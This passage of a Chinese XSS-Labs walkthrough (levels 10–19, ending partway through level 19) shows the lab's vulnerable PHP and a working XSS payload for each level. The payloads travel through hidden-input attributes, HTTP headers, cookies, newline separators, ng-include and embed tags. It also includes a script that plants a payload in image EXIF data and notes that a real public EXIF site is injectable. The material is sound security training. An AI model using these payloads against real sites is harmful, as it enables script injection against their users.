## 1. 删尖括号
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
服务器主动把 keyword 编码成了实体，因此这些字符永远只是文字。

真正的突破口是在参数`t_sort`

但是有个`type="hidden"`一个看不见的元素，还能获得焦点吗？autofocus 还会生效吗？

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937237384_6kyjk6.webp)

---

### 1.2 漏洞点
### Q1：标签重复属性规则
> 同一个标签内写**同名属性，浏览器只解析第一个，后面重复同名属性直接丢弃忽略**。
>

示例：

```plain
<input value="a" value="b">
```

浏览器只取第一个 `value="a"`，第二个`value="b"`直接扔掉，输入框值为`a`。

我们可控点在`value`属性引号内部，注入payload，**在字符流靠前位置写入**`type=text`。  
注入后完整标签：

```plain
<input name="t_sort" value="" type=text autofocus onfocus=alert(1) x="" type="hidden">
```

1. 我们注入的 `type=text` 在前面，**优先生效**
2. 服务器原生的 `type="hidden"` 在后面，属于重复属性，被浏览器直接丢弃

👉 这就叫**属性抢夺（抢type）**，把原本隐藏的input，强行改成普通文本输入框。

---

### Q2：`type="hidden"`无法获取焦点，onfocus不会执行
> type="hidden" → 不渲染在页面上（元素存在，但看不见），不可见元素一律拒绝聚焦 → 点不到、Tab 跳过、autofocus 静默失效 → onfocus永远等不到它的扳机
>

`onfocus`事件：**只有元素拿到焦点才触发**  
获取焦点两种方式：鼠标点击、`autofocus` / Tab切换焦点。

+ `type="hidden"`：浏览器标记为非交互控件，看不见、点不到，`autofocus`失效，`onfocus`不会执行。
+ 所以直接在原hidden框写事件，代码属于死代码，无法弹框。

> 解题逻辑：必须先用属性抢夺，把`type`改成`text`，让输入框变成可聚焦的正常控件，`autofocus`和`onfocus`才有机会运行。
>

## 2. Payload
```plain
t_sort=" type=text autofocus onfocus=alert(1) x="
```

| 片段 | 作用 |
| --- | --- |
| `"` | 闭合前面`value=`的双引号，跳出value属性 |
| `type=text` | **抢夺属性**，覆盖后端写死的type="hidden"，放前面优先生效 |
| `autofocus` | 页面加载自动获取焦点 |
| `onfocus=alert(1)` | 获取焦点立刻执行弹窗XSS |
| `x="`或者`//` | 吃掉后端原本闭合value的双引号，修补语法，防止标签乱掉 |


`autofocus + onfocus`实现无需人工交互自动触发XSS

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937239068_b1sr62.webp)

---

# Level 11
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937241305_tqhyyw.webp)

## 1.  Referer 头注入  
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
1. `t_sort`：GET参数，经过`htmlspecialchars()`转义，`< > & " ` 被转义，并且`value` 是双引号包裹属性，不能在这里做属性注入。
2. `$str11=$_SERVER['HTTP_REFERER'];`

```plain
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

3. t_ref：来自Referer头，仅删除`< >`，双引号未过滤，本题唯一注入点

---

### 1.2 漏洞点
只过滤了 `<` 和 `>`，直接把处理后的字符串塞到 `value="..."` 里面

没有转义双引号 `"`！可以闭合value属性，做**属性抢夺XSS**

---

**Q1：HTTP Referer 请求头**

#### 1. 基础概念  
告诉服务器，当前请求是从哪个页面跳转过来的属于**HTTP 请求头**，不是 GET、POST 参数。

> PHP 读取：`$_SERVER['HTTP_REFERER']`
>
> 注意：PHP 里面带下划线 `HTTP_REFERER`，对应请求头 `Referer`；HTTP 请求头的横杠 `-` 在 PHP `$_SERVER` 中全部转为下划线 `_`、全部大写。  
>
> Referer 由浏览器 / 抓包工具生成，攻击者可以随意篡改内容。
>
> 服务器拿到 Referer 的值，就直接相信这个字符串，不会校验是不是真实跳转地址。
>

#### 2. 请求头名字映射规则
| HTTP 请求头 | $_SERVER 里面变量名 |
| --- | --- |
| Referer | `$_SERVER['HTTP_REFERER']` |
| User‑Agent | `$_SERVER['HTTP_USER_AGENT']` |
| X‑Forwarded‑For | `$_SERVER['HTTP_X_FORWARDED_FOR']` |


> 这一类全部是**客户端可控**，很容易出现头注入漏洞。  
>

---

## 2. Payload
Payload 放到HTTP Referer请求头

> 注意：这道题**不是GET参数传payload，是修改HTTP请求头 Referer**，Burp抓包改Referer字段。
>

### 方式一：bp
1. 访问 level11.php，抓包

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937243200_e2i378.webp)



2. 修改请求头

```plain
Referer: " type=text autofocus onfocus=alert(1) x="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937245728_h4w7st.webp)



3. 发送数据包

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937247769_or0n45.webp)

---

### 方式二：Hackbar
```plain
Referer: " type=text autofocus onfocus=alert(1) x="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937250460_7nftm8.webp)

---

# Level 12
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937252457_y9145d.webp)

## 1. User-Agent 头注入
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
这题和 Level 11 的区别在于`$str11=$_SERVER['HTTP_USER_AGENT'];`

## 2. payload
### 方式一：Hackbar
```plain
User-Agent: " type=text autofocus onfocus=alert(1) x="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937254307_0gllq0.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937256132_xjz55n.webp)

---

### 方式二：bp
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937257672_7dbed1.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937259738_mf10di.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937262375_v4w95l.webp)

---

# Level 13
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937264028_x5te1w.webp)

## 1. Cookie 注入
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

## 2. payload
### 方式一：Hackbar
```plain
Cookie: user=" type=text autofocus onfocus=alert(1) x="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937266075_5v1ztt.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937267774_i6xlkx.webp)

---

### 方式二：bp
```plain
Cookie: user=" type=text autofocus onfocus=alert(1) x="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937269438_c7xsh1.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937271478_08iraf.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937273937_0hq6uc.webp)

---

# Level 14
> 说明：
>
>  由于本关因**iframe**调用的文件地址失效，无法进行测试。  
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937275607_tqq1d7.webp)
>

## 1. 文件元数据（EXIF）注入
某些社交平台的"上传照片后显示拍摄信息"功能曾因为这个漏洞被利用——用户上传一张带恶意EXIF 的照片，所有查看这张照片详情的用户都会中招。

本地模拟方案：

[https://gitee.com/jasminee0762/cyber-security/blob/master/%E5%AE%9E%E9%AA%8C%E9%99%84%E4%BB%B6/%E6%96%87%E4%BB%B6%E5%85%83%E6%95%B0%E6%8D%AE%EF%BC%88EXIF%EF%BC%89%E6%B3%A8%E5%85%A5%E9%99%84%E4%BB%B6.zip](https://gitee.com/jasminee0762/cyber-security/blob/master/%E5%AE%9E%E9%AA%8C%E9%99%84%E4%BB%B6/%E6%96%87%E4%BB%B6%E5%85%83%E6%95%B0%E6%8D%AE%EF%BC%88EXIF%EF%BC%89%E6%B3%A8%E5%85%A5%E9%99%84%E4%BB%B6.zip)

```php
<?php
header('Content-Type: text/html; charset=utf-8');
echo '<!DOCTYPE html><html><head><title>本地 EXIF 查看器</title></head><body>';
echo '<h2 align=center>上传图片查看 EXIF</h2>';
echo '<form method="post" enctype="multipart/form-data" align=center>';
echo '<input type="file" name="image" accept="image/jpeg">';
echo '<input type="submit" value="上传">';
echo '</form>';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $tmp = $_FILES['image']['tmp_name'];
    echo '<hr><h3 align=center>EXIF 元数据（原样回显）</h3>';
    echo '<pre>';
    $exif = exif_read_data($tmp);
    if ($exif === false) {
        echo '图片无 EXIF 数据或不支持的格式';
    } else {
        foreach ($exif as $key => $section) {
            if (is_array($section)) {
                foreach ($section as $name => $val) {
                    echo "$key.$name: $val\n";
                }
            } else {
                echo "$key: $section\n";
            }
        }
    }
    echo '</pre>';
}
echo '</body></html>';
```

+ 输入：用户上传图片
+ 处理：exif_read_data() 读取
+ 输出： 直接打印
+ 缺陷：无 htmlspecialchars()



如果不想本地部署，可以使用：[https://www.sojson.com/image/exif.html](https://www.sojson.com/image/exif.html) 

该网站也存在 EXIF 注入点

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937277931_lpnmr5.webp)

---

### 1.1 复现步骤
#### 1.1.1 生成带 Payload 的图片
##### 方式一： Windows 系统进入属性页面直接修改  
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937280951_179nsz.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937283013_5qy917.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937285197_rxfspm.webp)

---

##### 方式二：Linux 系统 使用 exiftool
> exiftool：Perl 写的**元数据读写工具**，读取 / 修改 / 删除文件 EXIF、XMP、IPTC 元数据；Kali 自带，misc 图片题高频工具。
>
> EXIF：图片附加信息：相机型号、时间、GPS、注释、Artist、Copyright、UserComment 等。  
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937286930_tf03cf.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937288590_96fi8q.webp)

---

##### 方式三：本地脚本
```python
import io, piexif
from PIL import Image

img = Image.new('RGB', (1, 1), color=(255, 255, 255))
buffer = io.BytesIO()
img.save(buffer, format='JPEG')
jpeg_bytes = buffer.getvalue()
# 尝试写入 EXIF
exif_dict = {'Exif': {}}
payload = '<img src=x onerror=alert(1)>'		# 可以换成其他的payload
exif_dict['Exif'][piexif.ExifIFD.UserComment] = payload.encode('utf-8', errors='ignore')
exif_dat = piexif.dump(exif_dict)
print("exif data created:", len(exif_dat))
try:
    dest = r'C:\Users\Jasmine\Desktop\xss_img.jpg'	# 换成自己的路径
    piexif.insert(exif_dat, jpeg_bytes, dest)
    print("saved to:", dest)
except Exception as e:
    print("insert failed:", e)
```



如果上传文件显示：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937290920_udfi8b.webp)

说明phpStudy 的 PHP 没启用 exif 扩展

打开 phpStudy → 设置 → 配置文件 → php.ini

搜索 ;extension=exif（在文件里按 Ctrl+F 查）

把前面那个分号 ; 删掉

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937292523_tx1jw9.webp)

重新上传

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937295478_pz25nf.webp)

---

## 2. 处理文件元数据的正确做法
1. 只显示字段名，不显示具体值
2. 对值做 HTML 实体编码后再输出
3. 白名单过滤——只允许显示特定几个字段（如拍摄时间、相机型号）

---

# Level 15
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937297854_e62pox.webp)



注:

我们点击 Level 14 的跳转链接

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937299766_texiao.webp)

会默认跳转到这个链接：

`http://127.0.0.1:81/xss/level15.php?src=1.gif`（写死了）

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937301396_15uen4.webp)

以我的靶场为例：

我存放 XSS-Labs 靶场的路径是`/xss_bachang/xss/`

所以需要手动改，正确的链接是：

`http://127.0.0.1:81/xss_bachang/xss/level15.php?src=1.gif`

---

## 1. ng-include
```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937303310_pld5ab.webp)

### 1.1 分析
src 参数有 htmlspecialchars 过滤`" < > &`

### Q1：`ng-include`是什么？
> ng‑include 是 **AngularJS(1.x，旧版angular，不是现在的Angular)** 的前端指令，**客户端包含，不是PHP服务端include**。  
作用：AJAX加载外部HTML模板，把返回的HTML片段插入当前DOM节点内部。
>

#### 1. 基础语法
```plain
<!-- 写死路径，字符串字面量，路径必须套单引号 -->
<div ng‑include="'header.html'"></div>
<!-- 绑定变量，变量来自js作用域，不要写引号 -->
<div ng‑include="myUrl"></div>
```

> ⚠️关键点：
>
> + `ng‑include="值"`里面是**AngularJS表达式**。
> + 写死文件路径必须**内部加单引号**：`'level1.php'`；不加引号就会当成变量名去作用域找变量，不会当成字符串路径。
>

#### 2. 和PHP include核心区别
| 项目 | PHP include（服务端包含） | ng‑include（客户端包含） |
| --- | --- | --- |
| 执行位置 | **服务器上执行** | **浏览器AJAX请求，前端执行** |
| PHP代码 | 被包含的php会在服务器运行 | 请求php接口拿到**返回的HTML响应**，服务器已经把php执行完了，浏览器拿输出结果 |
| 文件读取 | 读服务器本地磁盘文件 | 发HTTP GET请求拿页面输出，不能直接读服务器本地文件 |


> ng‑include 不会读取服务器磁盘文件；它是发http请求访问url，拿到页面渲染后的HTML结果插入页面。
>

#### 3. 重要特性
1. 同源策略：默认只能加载**同域名**资源，跨域被浏览器拦截。
2. 加载回来的内容中，`<script>xxx</script>`标签**不会自动执行**；但是**事件处理器可以执行**：`onerror、onclick、onfocus`这类事件可以触发XSS。
3. 内部走`$sce`严格上下文转义校验，不信任的URL会被拦截。
4. 它会编译AngularJS模板语法。

---

### Q2：`ng‑app` 是什么？
`ng‑app` 是 AngularJS1.x 的启动指令，负责开启整个angular解析。

```plain
<div ng‑app>……</div>
```

+ 作用：标记DOM范围，告诉浏览器**从这个标签内部开始启用AngularJS解析**。
+ 没有写`ng‑app`，页面上`ng‑include`这类指令完全不会生效，直接当成普通文本。

---

### Q3：`$sce`是什么？
SCE：Strict Contextual Escaping，严格上下文转义。安全关卡，拦截不受信任的资源地址。

+ AngularJS内置安全机制，不信任来源不明的URL、HTML。
+ `ng‑include`加载外部URL会经过`$sce`校验，**默认拒绝不可信外部地址**。
+ 如果后端把变量标记为`$sce.trustAsResourceUrl(xxx)`，才会放行加载。
+ 如果`$sce`没有被绕过，即使可控ng‑include的参数，也会直接拦截AJAX请求。

---

### 1.2 漏洞点
level15 页面本身做了`htmlspecialchars`，无法在本页面完成 XSS；

但是ng‑include提供二次请求能力，把携带 payload 的请求转发到完全没有过滤的 level1 页面。

URL 编码的 payload 经过二次网络传输，在 level2 裸回显处完成解码，生成真实 HTML 标签触发事件 XSS。

> 1. 误区：**不需要手动二次 URL 编码**。浏览器、PHP 会自动完成 URL 编解码流程。
> 2. 手动双重编码会导致 payload 到达 level2 依旧是编码字符串，无法解析 HTML 标签，漏洞失效。 双重编码仅用于后端源码存在手动`urldecode()`的场景。  
>

---

### 1.3 漏洞利用流程
#### 1.3.1 浏览器对 URL 进行自动 URL 编码
`<`转为`%3C`，`>`转为`%3E`，发送 HTTP GET 请求。



#### 1.3.2 PHP 后端接收 GET 参数`src`
执行**一次 URL 解码**，拿到原始字符串：`'level2.php?keyword=<img src=x onerror=alert(1)>'`



#### 1.3.3 PHP 调用`htmlspecialchars()`
HTML 实体编码，输出到 HTML 页面源码`<`变成`&lt;`，`>`变成`&gt;`。

> ⚠️注意：这只是**页面源码层面的实体编码**，只影响 DOM 显示；**不会修改 ng‑include 指令内部表达式逻辑，不会篡改后续 AJAX 请求的参数**。
>



#### 1.3.4 AngularJS 解析页面
+ 页面存在`ng‑app`，AngularJS 启动；
+ 解析`ng‑include="我们传入的字符串"`；
+ 目标地址`level1.php`属于**同源相对路径**，命中`$sce`内置`self`白名单，不拦截，发起浏览器侧 AJAX GET 请求。



#### 1.3.5 浏览器 AJAX 访问 level1.php
浏览器再次自动对 url 里的 query 参数做 URL 编码，发出请求。



#### 1.3.6 level1.php 接收 name 参数
PHP 自动 URL 解码，拿到原始 payload：`<img src=x onerror=alert(1)>`。  
level1 没有任何过滤，直接把这段字符串输出到 HTTP 响应页面中。



#### 1.3.7 ng‑include 接收返回的 HTML 片段
插入当前页面 DOM，完成 XSS 触发  

---

## 2. payload
```plain
?src='level1.php?name=<img src=x onerror=alert(1)>'
```

+ 必须给路径加上**单引号**，告诉angular这是字符串字面量url
+ `src=x`图片加载失败，触发`onerror`事件，执行`alert(1)`，XSS 漏洞触发完成。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937305373_wnjo83.webp)

---

# Level 16
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937307467_qnwngo.webp)

## 1. 分隔符
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace(" ","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
空格和`/`、`script`被封了

我们的输入落在 `<center>` 元素的文本节点里。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937309763_5dufop.webp)

### 1.2 漏洞点
HTML 语法里属性之间能分隔的还有：换行分隔，URL 里写 %0a

回显点是正文区，不需要 `">`，直接裸标签。

## 2. payload
在 url 改

```plain
<img%0asrc=x%0aonerror=alert(1)>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937311411_eblpgx.webp)

---

# Level 17
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937313062_mkrp6b.webp)

## 1. `<embed>` 标签注入
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！"); 
}
</script>
<title>欢迎来到level17</title>
</head>
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
</html>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937314383_dq6g4o.webp)

### Q1：`xsf`是什么？
Cross‑Site Flashing，跨站 Flash  

#### 模式 1：加载外部 SWF 文件（XSF 本体）
swf 程序的`loadMovie()`/`loadMovieNum()`等函数，**URL 参数可控**。 攻击者让正常 swf 去加载**黑客的恶意 swf 文件**；恶意 swf 在沙箱内执行，调用`ExternalInterface.call()`，实现执行页面 JS，触发 XSS。

流程：

```plain
网页嵌入正常swf → url参数控制加载地址 → 加载恶意第三方swf → 恶意swf调用ExternalInterface.call() → 执行JS代码
```

#### 模式 2：Flash XSS
Flash 文件通过 `ExternalInterface.call(参数)` 与页面 JS 交互，若 swf 从 URL 参数读取数据并传入该接口、且参数可控，则构成反射型 XSS。

> `.swf`：**Flash 编译后的二进制文件**，相当于 Flash 的程序文件   
>
> 2020 年底 Flash 全线停服，此类漏洞随之消亡 —— 但“组件从外部输入取值并交给危险接口”这个漏洞模式永恒存在 
>
> 现代等价漏洞场景：postMessage处理不当、eval(location.hash.slice(1))、模板注入等。  
>

---

### 1.1 分析
```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

arg01 和 arg02 被拼进 src 属性值里面，这个属性没加引号。没有引号意味着——只要能塞进去一个空格，空格后面的内容就会被浏览器当成embed的新属性，不用逃出属性，本身就是注入点。

htmlspecialchars 编码 `< > " &`，而我们不需要用到这些字符

---

### 1.2 漏洞点
HTML 属性注入

触发选什么事件？

embed 不是输入框，没有 autofocus+onfocus 那条路。能让它触发弹窗的就是鼠标类事件，选onmouseover，鼠标划过 Flash 区域就触发

---

## 2. payload
```html
?arg01=a&arg02=b onmouseover='javascript:alert(1)'
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937316485_rldjoy.webp)

---

# Level 18
和 Level 17 一样，只换了个 swf 文件名

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
</html>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937318521_8nrp3c.webp)

---

# Level 19
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937320724_1670kh.webp)

## 1. htmlText 渲染
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>
```

### 1.1 分析
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937322256_61slvp.webp)

我们发现用之前的 payload 不行了



对比一下这两段代码：

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937323665_p9a5el.webp)

```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";

echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
```

区别在于：这一关的 `src` 加上了引号。PHP使用`htmlspecialchars()`，双引号被转义，**无法在HTML层闭合src的双引号**；空格也被包裹在引号内，不能分割出新属性。

src="xsf03.swf? + 我的输入 " ，因此利用 swf 读取 URL 参数，在 Flash 内部渲染恶意 HTML，实现 XSF 攻击。

### Q1：SWF 如何读取URL查询参数？
浏览器访问嵌入swf的地址：

```plain
<embed src="xsf03.swf?arg01=xxx&arg02=yyy">
```

+ `?`后面的查询字符串，会完整传递给swf程序。
+ ActionScript（Flash脚本）可以直接读取url上的query参数。
+ 哪怕外层HTML被双引号、`htmlspecialchars()`封死，**参数依然会原样送入swf内部**。

> 重点：`htmlspecialchars()`只做HTML转义，**不会修改URL查询字符串本身的值**。转义只影响浏览器HTML解析，swf拿到的是原始query参数。
>



> 我们GET传入的可控内容，就进入了Flash程序的变量。
>

---

### Q2：Flash内部渲染HTML
Flash提供API，可以直接解析、渲染HTML片段，**在Flash沙箱内部生成DOM、执行JS**。  
代表API：

+ `htmlText` 属性：Flash文本组件支持解析一小部分HTML标签。
+ `ExternalInterface.call()`：swf调用宿主浏览器的JavaScript（最核心）。

#### 1. 两个 “解析器”
##### 1.1 浏览器 HTML 解析器
